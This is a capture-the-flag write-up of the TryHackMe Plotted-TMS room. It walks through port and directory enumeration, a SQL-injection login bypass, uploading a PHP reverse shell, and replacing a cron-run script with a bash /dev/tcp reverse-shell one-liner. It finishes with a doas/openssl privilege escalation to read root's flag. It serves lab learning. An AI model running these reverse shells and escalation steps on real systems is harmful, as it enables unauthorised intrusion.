# Plotted-TMS

This a ctf challenge which is designed for enumeration is a key and It is the [Plotted-TMS](https://tryhackme.com/room/plottedtms) room of TryHackMe, now we can move on to the challenge

### Nmap Result

```
nmap 10.10.156.180 -A -T4
Starting Nmap 7.95 ( https://nmap.org ) 
Nmap scan report for 10.10.156.180
Host is up (0.39s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                          
```

In the nmap result we can see there was two web service running on port 80 and 445 and by checking that we can see both ports contain default Apache page so we are going to use the next method, **Directory Enumeration** 

![pt](./static/images/pt1.png)

At port 80 we have found set of directory using the tool ffuf or we can use gobuster

```
ffuf -u "http://10.10.156.180/FUZZ" -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.156.180/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3157ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3169ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 173ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5221ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5220ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 190ms]
passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 270ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 183ms]
shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 176ms]
:: Progress: [4614/4614] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

now visiting shadow and passwd and admin directory gave us a base64 encoded string but decoding it we found it is a distraction : )

```
// shadow and passwd directory
echo "bm90IHRoaXMgZWFzeSA6RA==" | base64 -d
not this easy :D  

// admin directory
echo "VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE" | base64 -d
Trust me it is not this easy..now get back to enumeration :D     
```

Futher enumeration in port 445 and found a management directory that host a **Traffic Offense Management System** with a login which is vulnerable to SQL Injection. In the directory enumeration and usual ctf the username could be **admin** so by using it we able to login as admin

![pt](./static/images/pt2.png)

By checking the source there was a directory for upload which is viewable

![pt](./static/images/pt3.png)

So there could be a possibility for reverse shell, it could a php file from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) , change the ip address in the file and moving the uploads directory to get a reverse shell by clicking that file

![pt](./static/images/pt4.png)

```
nc -lvp 8000                                                    
listening on [any] 8000 ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ 
```

and we have to further enumerating we discovered there is crontab running for plot_admin so we can add a one line bash reverse shell to get plot_admin user shell

```
bash -i >& /dev/tcp/<your_ipaddress>/8080 0>&1
```

But we cannot write in backup.sh because the file belongs to plot_admin so we delete it and get the backup.sh for our computer because www-data has access in this directory for creating a new file and it can get executed by the crontab

```
wget http://<your_ip>/backup.sh

     0K                                                       100% 13.6M=0s

$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Jul 24 09:02 .
drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
-rw-rw-rw- 1 www-data www-data   55 Jul 24 08:58 backup.sh

chmod +x backup.sh
```

```
nc -lvp 1234
$ pwd
/home/plot_admin
$ id
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
$ cat user.txt  
flag_removed
```

further privilege escalation will checking the suid bit that has root we found a interesting unusual binaries, **doas** is a privilege escalation tool similar to sudo, designed to allow users to run commands as another user, typically root

```
find / -type f -perm -04000 -ls 2>/dev/null
/usr/bin/doas

// checking conf for it
plot_admin@plotted:~$ cat /etc/doas.conf
cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```

In doas configuration we can find that openssl can be run with root privilege, so now we are going to use the [Gtfobins](https://gtfobins.github.io/gtfobins/openssl/) to exploit using openssl to read the file

```
plot_admin@plotted:~$ doas openssl enc -in /root/root.txt
doas openssl enc -in /root/root.txt
Congratulations on completing this room!

flag_removed

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
plot_admin@plotted:~$ 
```


Hurray we completed it :)

